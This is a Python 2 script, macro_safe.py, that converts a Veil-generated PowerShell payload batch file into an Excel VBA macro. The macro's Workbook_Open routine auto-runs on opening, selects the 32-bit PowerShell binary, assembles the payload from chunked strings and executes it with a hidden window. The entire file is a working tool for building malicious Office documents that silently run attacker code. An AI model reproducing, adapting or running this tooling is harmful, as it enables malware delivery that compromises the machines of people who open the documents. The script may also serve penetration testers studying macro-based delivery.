#!/usr/bin/python

#####
# macro_safe.py
#####
#
# Takes Veil powershell batch file and outputs into a text document 
# macro safe text for straight copy/paste.
#

import os, sys
import re

def formStr(varstr, instr):
 holder = []
 str1 = ''
 str2 = ''
 str1 = varstr + ' = "' + instr[:54] + '"' 
 for i in xrange(54, len(instr), 48):
 	holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
 	str2 = '"\r\n'.join(holder)
 
 str2 = str2 + "\""
 str1 = str1 + "\r\n"+str2
 return str1

if len(sys.argv) < 2:
 print "----------------------\n"
 print " Macro Safe\n"
 print "----------------------\n"
 print "\n"
 print "Takes Veil batch output and turns into macro safe text\n"
 print "\n"
 print "USAGE: " + sys.argv[0] + " <input batch> <output text>\n"
 print "\n"
else:

 fname = sys.argv[1]
 
 f = open(fname)
 lines = f.readlines()
 f.close()
 cut = []

 for line in lines:
 	if "@echo off" not in line:
 		first = line.split('else')
 		#split on else to truncate the back half
 
 		# split on \" 
 		cut = first[0].split('\\"', 4)
 
 		#get rid of everything before powershell
 		cut[0] = cut[0].split('%==x86')[1] 
 		cut[0] = cut[0][2:] 

 		#get rid of trailing parenthesis
 		cut[2] = cut[2].strip(" ")
 		cut[2] = cut[2][:-1]

 # for i in range(0,3):
 # print str(i) + " " +cut[i]
 
 top = "Sub Workbook_Open()\r\n"
 top = top + "\'VBA arch detect suggested by \"T\"\r\n"
 top = top + "Dim Command As String\r\n"
 top = top + "Dim str As String\r\n"
 top = top + "Dim exec As String\r\n"
 top = top + "\r\n"
 top = top + "Arch = Environ(\"PROCESSOR_ARCHITECTURE\")\r\n"
 top = top + "windir = Environ(\"windir\")"
 top = top + "\r\n"
 top = top + "If Arch = \"AMD64\" Then\r\n"
 top = top + "\tCommand = windir + \"\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"\r\n"
 top = top + "Else\r\n"
 top = top + "\tCommand = \"powershell.exe\"\r\n"
 top = top + "End If\r\n" 


 #insert '\r\n' and 'str = str +' every 48 chars after the first 54.
 payL = formStr("str", str(cut[1]))
 
 #double up double quotes, add the rest of the exec string 
 idx = cut[0].index('"')	#tells us where IEX is. Now we also have to subtract 10 to remove -Command  
 
 #next our stub for the payload 
 cut[0] = cut[0] + "\\\"\" \" & str & \" \\\"\" " + cut[2] +"\""	#deprecated
 
 #insert 'exec = exec +' and '\r\n' every 48 after the first 54.
 execStr = formStr("exec", str(cut[0]))

 execStr = execStr.replace("\"powershell.exe", "Command + \"")
 execStr = execStr.replace("\"Invoke","\"\"Invoke")

 shell = "Shell exec,vbHide"
 bottom = "End Sub\r\n\r\n\'---Generated by macro_safe.py by khr0x40sh---\r\n\r\n\'---VBA arch detection by \"T\"---"
 
 final = ''
 final = top + "\r\n" + payL + "\r\n\r\n" + execStr + "\r\n\r\n" + shell + "\r\n\r\n" + bottom + "\r\n"

 print final

 try:
 	f = open(sys.argv[2],'w')
 	f.write(final) # python will convert \n to os.linesep
 	f.close()
 except:
 	print "Error writing file.\n Please check permissions and try again.\nExiting..."
 	sys.exit(1)
 
 print "File written to " + sys.argv[2] + " !"
